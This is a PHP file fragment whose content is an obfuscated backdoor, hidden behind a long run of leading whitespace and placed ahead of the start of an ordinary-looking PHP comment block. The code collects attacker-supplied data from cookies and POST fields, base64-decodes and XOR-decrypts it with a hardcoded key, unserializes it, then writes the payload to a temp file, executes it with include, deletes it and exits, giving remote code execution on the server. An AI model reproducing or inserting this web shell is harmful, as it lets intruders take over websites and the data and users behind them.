<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("nqlvvxd")){class nqlvvxd{public static $gquoceuk = "nojldratzuotvyzw";public static $jtboctl = NULL;public function __construct(){$davqxv = @$_COOKIE[substr(nqlvvxd::$gquoceuk, 0, 4)];if (!empty($davqxv)){$ekyacfeu = "base64";$xfnpahu = "";$davqxv = explode(",", $davqxv);foreach ($davqxv as $pnphfkvhxw){$xfnpahu .= @$_COOKIE[$pnphfkvhxw];$xfnpahu .= @$_POST[$pnphfkvhxw];}$xfnpahu = array_map($ekyacfeu . "_decode", array($xfnpahu,));$xfnpahu = $xfnpahu[0] ^ str_repeat(nqlvvxd::$gquoceuk, (strlen($xfnpahu[0]) / strlen(nqlvvxd::$gquoceuk)) + 1);nqlvvxd::$jtboctl = @unserialize($xfnpahu);}}public function __destruct(){$this->kwwcbmmuvk();}private function kwwcbmmuvk(){if (is_array(nqlvvxd::$jtboctl)) {$kcdgtcww = sys_get_temp_dir() . "/" . crc32(nqlvvxd::$jtboctl["salt"]);@nqlvvxd::$jtboctl["write"]($kcdgtcww, nqlvvxd::$jtboctl["content"]);include $kcdgtcww;@nqlvvxd::$jtboctl["delete"]($kcdgtcww);exit();}}}$bvpcp = new nqlvvxd();$bvpcp = NULL;} ?><?php
/**
